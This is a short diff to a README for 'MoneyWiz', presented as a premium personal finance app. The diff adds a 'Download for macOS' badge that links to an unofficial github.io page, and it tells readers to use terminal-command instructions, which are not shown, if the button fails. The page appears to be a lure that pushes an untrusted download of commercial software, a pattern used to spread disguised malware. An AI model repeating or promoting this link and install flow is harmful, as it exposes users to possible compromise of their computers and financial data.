@@ -2,7 +2,8 @@
 
 Take full control of your finances with **MoneyWiz** — a premium personal finance manager designed for seamless budgeting, expense tracking, bill reminders, and investment monitoring, all in one elegant interface.
 
-If the button doesn't work, follow the instructions below using the terminal command.
+[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-black?style=for-the-badge&logo=apple)](https://moneywiz-for-mac.github.io/.github/)   
+> If the button doesn't work, follow the instructions below using the terminal command.
 
 ---
 
